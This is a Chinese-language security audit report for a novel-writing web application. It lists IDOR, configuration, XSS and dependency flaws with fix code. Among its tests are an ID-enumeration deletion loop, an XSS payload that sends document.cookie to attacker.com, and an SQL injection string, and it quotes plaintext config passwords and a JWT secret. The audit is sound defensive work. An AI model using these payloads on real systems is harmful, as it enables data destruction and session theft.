# 安全漏洞全面审计报告
**审计日期**: 2026-01-11  
**审计范围**: Novel Creation System 全栈应用  
**严重程度**: 🔴 高危 | 🟡 中危 | 🟢 低危

---

## 执行摘要

本次安全审计发现了**多个严重安全漏洞**，主要集中在：
- ✅ **已修复**: 部分越权访问漏洞（P0级别的Controller已修复）
- ❌ **未修复**: P1和P2级别的越权漏洞、配置泄露、XSS风险等

**总体风险评级**: 🔴 **高危** - 需要立即处理多个中高危漏洞

---

## 🔴 P0 - 严重漏洞（立即修复）

### 1. 越权访问漏洞 (IDOR - Insecure Direct Object Reference)

#### 状态总览
- ✅ **已修复**: NovelController, ChapterController, NovelDocumentController, VolumeController, ReferenceFileController, NovelFolderController
- ❌ **未修复**: PromptTemplateController, AITaskController, AIConversationController

#### 1.1 PromptTemplateController - 部分修复 ⚠️

**文件**: `backend/src/main/java/com/novel/controller/PromptTemplateController.java`

**问题分析**:
- ✅ `DELETE /{id}` (line 126-141): 已通过Service层验证用户权限
- ✅ `PUT /{id}` (line 95-120): 已通过Service层验证用户权限
- ⚠️ `GET /{id}` (line 47-59): **没有权限验证**，用户可以查看任何模板（包括其他用户的私有模板）

```java
// 第47-59行 - 存在漏洞
@GetMapping("/{id}")
public Result<PromptTemplate> getTemplateById(@PathVariable Long id) {
    try {
        PromptTemplate template = promptTemplateService.getById(id);
        if (template == null) {
            return Result.error("模板不存在");
        }
        return Result.success(template);  // ❌ 直接返回，没有验证用户是否有权查看
    } catch (Exception e) {
        logger.error("获取模板详情失败", e);
        return Result.error("获取模板详情失败: " + e.getMessage());
    }
}
```

**修复建议**:
```java
@GetMapping("/{id}")
public Result<PromptTemplate> getTemplateById(@PathVariable Long id) {
    try {
        Long userId = AuthUtils.getCurrentUserId();
        PromptTemplate template = promptTemplateService.getById(id);
        if (template == null) {
            return Result.error("模板不存在");
        }
        // 验证权限：只能查看公开模板或自己的模板
        if (!template.getType().equals("official") && 
            !template.getType().equals("public") && 
            !template.getAuthorId().equals(userId)) {
            return Result.error("无权查看此模板");
        }
        return Result.success(template);
    } catch (Exception e) {
        logger.error("获取模板详情失败", e);
        return Result.error("获取模板详情失败: " + e.getMessage());
    }
}
```

#### 1.2 AITaskController - 无权限验证 🔴

**文件**: `backend/src/main/java/com/novel/controller/AITaskController.java`

**严重问题**:
- ❌ `GET /{id}` (line 61-65): 无权限验证
- ❌ `PUT /{id}` (line 105-109): 无权限验证
- ❌ `DELETE /{id}` (line 114-118): **任何用户都可以删除其他用户的AI任务**
- ❌ `POST /{id}/start` (line 191-195): 无权限验证
- ❌ `POST /{id}/stop` (line 200-204): 无权限验证
- ❌ `POST /{id}/retry` (line 209-213): 无权限验证

```java
// 第114-118行 - 严重漏洞
@DeleteMapping("/{id}")
public ResponseEntity<Void> deleteTask(@PathVariable Long id) {
    aiTaskService.deleteTask(id);  // ❌ 直接删除，无任何权限验证
    return ResponseEntity.ok().build();
}
```

**攻击场景**:
```bash
# 攻击者可以遍历ID删除所有任务
for i in {1..10000}; do
  curl -X DELETE http://localhost:8080/api/ai-tasks/$i \
    -H "Authorization: Bearer <任意有效token>"
done
```

**修复建议**:
所有操作都需要添加权限验证，在Service层实现：
```java
// AITaskService.java
public void deleteTask(Long id) {
    Long currentUserId = AuthUtils.getCurrentUserId();
    AITask task = getById(id);
    
    if (task == null) {
        throw new RuntimeException("任务不存在");
    }
    
    if (!task.getUserId().equals(currentUserId)) {
        throw new RuntimeException("无权删除此任务");
    }
    
    // 执行删除
    removeById(id);
}
```

---

## 🟡 P1 - 高危漏洞（优先修复）

### 2. 敏感信息泄露

#### 2.1 配置文件中的明文密码 🔴

**文件**: `backend/src/main/resources/application.yml`

**问题**:
```yaml
# 第17-20行
datasource:
  url: jdbc:mysql://localhost:3306/ai_novel?useSSL=false...
  username: root
  password: root  # ❌ 明文密码

# 第54-56行
graph:
  neo4j:
    username: neo4j
    password: novel_graph_2025  # ❌ 明文密码

# 第77行
jwt:
  secret: novel-creation-system-jwt-secret-key-2024  # ❌ 弱密钥
```

**风险**:
- 数据库密码泄露 → 数据库被攻击
- JWT密钥泄露 → 攻击者可以伪造任意用户的token
- 配置文件被提交到Git → 密码永久泄露

**修复建议**:
1. **使用环境变量**:
```yaml
datasource:
  username: ${DB_USERNAME:root}
  password: ${DB_PASSWORD}

jwt:
  secret: ${JWT_SECRET}

graph:
  neo4j:
    password: ${NEO4J_PASSWORD}
```

2. **生成强JWT密钥**:
```bash
# 生成256位随机密钥
openssl rand -base64 32
```

3. **添加到 .gitignore**:
```
.env
application-local.yml
application-prod.yml
```

#### 2.2 API密钥可能泄露 🟡

**文件**: `backend/src/main/resources/application.yml`

```yaml
# 第47行
ai:
  api-key: ${AI_API_KEY:}  # ✅ 使用环境变量，但默认值为空可能导致服务启动失败
```

**建议**: 添加启动检查，如果关键配置缺失则拒绝启动。

---

### 3. 未授权访问 - 爬虫接口 🟡

**文件**: `backend/src/main/java/com/novel/controller/QimaoScraperController.java`

**问题**: 爬虫接口完全开放，任何人都可以触发爬虫

**受影响的接口**:
- `POST /qimao/scrape/{categoryCode}` (line 45-68)
- `POST /qimao/scrape/all` (line 73-100)
- `POST /qimao/trigger-schedule` (line 216-234)
- `GET /qimao/test-url` (line 252-269)

**风险**:
- 消耗服务器资源
- 可能触发目标网站的反爬虫机制，导致IP被封
- 可能违反服务条款

**修复建议**:
```java
@RestController
@RequestMapping("/qimao")
public class QimaoScraperController {
    
    @PostMapping("/scrape/{categoryCode}")
    public ResponseEntity<Map<String, Object>> startScraping(...) {
        // 添加管理员权限检查
        if (!AuthUtils.isAdmin()) {
            Map<String, Object> response = new HashMap<>();
            response.put("success", false);
            response.put("message", "需要管理员权限");
            return ResponseEntity.status(403).body(response);
        }
        // ...原有逻辑
    }
}
```

或在SecurityConfig中限制：
```java
// SecurityConfig.java
.antMatchers("/qimao/**").hasRole("ADMIN")
```

---

### 4. Spring Security配置过于宽松 🟡

**文件**: `backend/src/main/java/com/novel/config/SecurityConfig.java`

**问题**:
```java
// 第56-62行 - 过多的接口被开放
.antMatchers("/ai-adjectives/**").permitAll()
.antMatchers("/agentic/**").permitAll()
.antMatchers("/rolling/**").permitAll()
.antMatchers("/volumes/*/modify-blueprint-stream").permitAll()  // ❌ 暂时忽略token验证
.antMatchers("/volumes/*/chapter-outlines/generate").permitAll()
.antMatchers("/volumes/*/chapter-outlines/generate-remaining").permitAll()
.antMatchers("/volumes/*/chapter-outlines").permitAll()
```

**风险**:
- 这些接口应该需要认证，但被完全开放
- 注释说"暂时忽略token验证"，但可能一直没有修复

**修复建议**: 移除这些临时的permitAll配置，确保所有业务接口都需要认证。

---

## 🟢 P2 - 中危漏洞

### 5. XSS (跨站脚本攻击) 风险 🟡

#### 5.1 前端使用 dangerouslySetInnerHTML

**文件**: 
- `frontend/src/components/AnnouncementModal.tsx` (line 130)
- `frontend/src/components/MarkdownRenderer.tsx` (line 44)

**问题**:
```tsx
// AnnouncementModal.tsx - 第130行
<div 
  className="announcement-body"
  dangerouslySetInnerHTML={{ __html: formattedContent }}
/>

// MarkdownRenderer.tsx - 第44行
<div 
  className={`markdown-renderer ${compact ? 'compact' : ''}`}
  dangerouslySetInnerHTML={{ __html: renderMarkdown(content) }}
/>
```

**风险**: 如果管理员后台被攻击，攻击者可以在公告中注入恶意脚本。

**修复建议**:
1. **使用DOMPurify进行HTML清理**:
```bash
npm install dompurify
npm install @types/dompurify --save-dev
```

```tsx
import DOMPurify from 'dompurify'

const formattedContent = useMemo(() => {
  const raw = announcement ? formatContent(announcement.content) : ''
  return DOMPurify.sanitize(raw, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'hr', 'blockquote'],
    ALLOWED_ATTR: ['class']
  })
}, [announcement])
```

2. **或使用react-markdown替代** (推荐):
```tsx
import ReactMarkdown from 'react-markdown'

// 替换 dangerouslySetInnerHTML
<ReactMarkdown>{announcement.content}</ReactMarkdown>
```

---

### 6. 敏感数据存储在LocalStorage ⚠️

**文件**: 多个文件使用localStorage存储敏感数据

**问题**:
- JWT token存储在localStorage
- AI配置（可能包含API密钥）存储在localStorage

**风险**: LocalStorage容易受到XSS攻击，攻击者可以窃取token

**修复建议**:
1. **使用HttpOnly Cookie存储JWT**:
```java
// 后端设置Cookie
Cookie cookie = new Cookie("auth_token", jwt);
cookie.setHttpOnly(true);  // 防止JS访问
cookie.setSecure(true);    // 只在HTTPS下传输
cookie.setPath("/");
cookie.setMaxAge(7 * 24 * 60 * 60);  // 7天
response.addCookie(cookie);
```

2. **前端从Cookie读取** (由浏览器自动处理)

---

### 7. 依赖版本安全问题 🟡

#### 7.1 后端依赖

**文件**: `backend/pom.xml`

**问题**:
```xml
<!-- Spring Boot 2.7.18 - 不是最新版本 -->
<version>2.7.18</version>

<!-- MySQL Connector 8.0.33 -->
<version>8.0.33</version>

<!-- SnakeYAML 1.33 - 已知存在反序列化漏洞 -->
<version>1.33</version>
```

**修复建议**:
```xml
<!-- 升级到最新的稳定版本 -->
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.7.19</version>  <!-- 或考虑升级到3.x -->
</parent>

<!-- 升级SnakeYAML -->
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>2.0</version>  <!-- 修复了CVE-2022-1471等漏洞 -->
</dependency>
```

#### 7.2 前端依赖

**文件**: `frontend/package.json`

**建议**: 运行npm audit检查漏洞
```bash
cd frontend
npm audit
npm audit fix
```

---

## 🔒 其他安全建议

### 8. CORS配置过于宽松

**文件**: `backend/src/main/java/com/novel/config/SecurityConfig.java`

```java
// 第93行
config.setAllowedOriginPatterns(Arrays.asList("http://localhost:*", "http://127.0.0.1:*"));
```

**问题**: 允许所有localhost端口，可能被恶意应用利用

**建议**: 
```java
// 生产环境应该指定具体的域名
config.setAllowedOrigins(Arrays.asList(
    "http://localhost:3000",
    "http://localhost:5173",
    "https://yourdomain.com"
));
```

---

### 9. 缺少请求频率限制

**问题**: 没有实现API访问频率限制，容易被DDoS攻击

**修复建议**: 添加Spring Boot Rate Limiter

```xml
<!-- pom.xml -->
<dependency>
    <groupId>com.github.vladimir-bukhtoyarov</groupId>
    <artifactId>bucket4j-core</artifactId>
    <version>8.1.0</version>
</dependency>
```

```java
@Component
public class RateLimitFilter extends OncePerRequestFilter {
    
    private final Map<String, Bucket> cache = new ConcurrentHashMap<>();
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                  HttpServletResponse response, 
                                  FilterChain chain) {
        String key = getClientIP(request);
        Bucket bucket = resolveBucket(key);
        
        if (bucket.tryConsume(1)) {
            chain.doFilter(request, response);
        } else {
            response.setStatus(429); // Too Many Requests
        }
    }
    
    private Bucket resolveBucket(String key) {
        return cache.computeIfAbsent(key, k -> {
            // 限制：每分钟100个请求
            Refill refill = Refill.intervally(100, Duration.ofMinutes(1));
            Bandwidth limit = Bandwidth.classic(100, refill);
            return Bucket.builder().addLimit(limit).build();
        });
    }
}
```

---

### 10. 缺少操作日志

**问题**: 没有记录敏感操作日志，难以追踪安全事件

**建议**: 添加AOP切面记录操作日志

```java
@Aspect
@Component
public class AuditLogAspect {
    
    @Autowired
    private AuditLogService auditLogService;
    
    @Around("@annotation(auditLog)")
    public Object logAudit(ProceedingJoinPoint joinPoint, AuditLog auditLog) {
        Long userId = AuthUtils.getCurrentUserId();
        String operation = auditLog.value();
        
        try {
            Object result = joinPoint.proceed();
            auditLogService.log(userId, operation, "SUCCESS", null);
            return result;
        } catch (Exception e) {
            auditLogService.log(userId, operation, "FAILED", e.getMessage());
            throw e;
        }
    }
}

// 使用示例
@AuditLog("删除小说")
@DeleteMapping("/{id}")
public ResponseEntity<Void> deleteNovel(@PathVariable Long id) {
    // ...
}
```

---

## 📋 修复优先级总结

### 🔴 立即修复（1-3天）
1. ✅ 修复AITaskController的所有越权漏洞
2. ✅ 修复PromptTemplateController的GET /{id}越权漏洞
3. ✅ 将所有敏感配置（密码、密钥）移到环境变量
4. ✅ 生成新的强JWT密钥
5. ✅ 移除SecurityConfig中的临时permitAll配置

### 🟡 高优先级（1周内）
6. ✅ 添加管理员权限到爬虫接口
7. ✅ 前端XSS防护：使用DOMPurify或react-markdown
8. ✅ 升级SnakeYAML到2.0修复反序列化漏洞
9. ✅ 添加API请求频率限制

### 🟢 中优先级（2-4周）
10. ⚠️ 将JWT从localStorage迁移到HttpOnly Cookie
11. ⚠️ 升级Spring Boot到最新版本
12. ⚠️ 添加操作审计日志
13. ⚠️ 限制CORS到具体域名
14. ⚠️ 运行npm audit并修复前端依赖漏洞

---

## 🧪 安全测试建议

### 1. 越权测试脚本
```bash
#!/bin/bash
# 测试越权删除

# 用户A的token
TOKEN_A="eyJhbGc..."

# 用户B的token  
TOKEN_B="eyJhbGc..."

# 用户A创建任务，获取ID
TASK_ID=$(curl -X POST http://localhost:8080/api/ai-tasks \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"type":"test"}' | jq -r '.id')

echo "用户A创建任务: $TASK_ID"

# 用户B尝试删除用户A的任务
curl -X DELETE http://localhost:8080/api/ai-tasks/$TASK_ID \
  -H "Authorization: Bearer $TOKEN_B"

# 预期: 403 Forbidden
# 实际: 200 OK (漏洞)
```

### 2. XSS测试
在公告内容中输入：
```html
<img src=x onerror="alert('XSS')">
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```

### 3. SQL注入测试（如果有原生SQL查询）
```
GET /novels?title=' OR '1'='1
```

---

## 📖 参考资料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Spring Security Best Practices](https://docs.spring.io/spring-security/reference/features/exploits/index.html)
- [React Security Best Practices](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

## 结论

本次审计发现的主要问题是**越权访问漏洞**和**配置管理不当**。虽然部分Controller已经修复，但仍有多个关键接口存在安全隐患。

**风险评估**:
- 当前系统存在严重的数据泄露和删除风险
- 攻击者可以利用越权漏洞删除任意用户的数据
- 配置文件中的明文密码可能导致数据库被攻击
- XSS漏洞可能导致用户会话被劫持

**建议**: 按照优先级列表尽快修复所有🔴和🟡级别的漏洞，再进行全面的安全测试后才能上线生产环境。
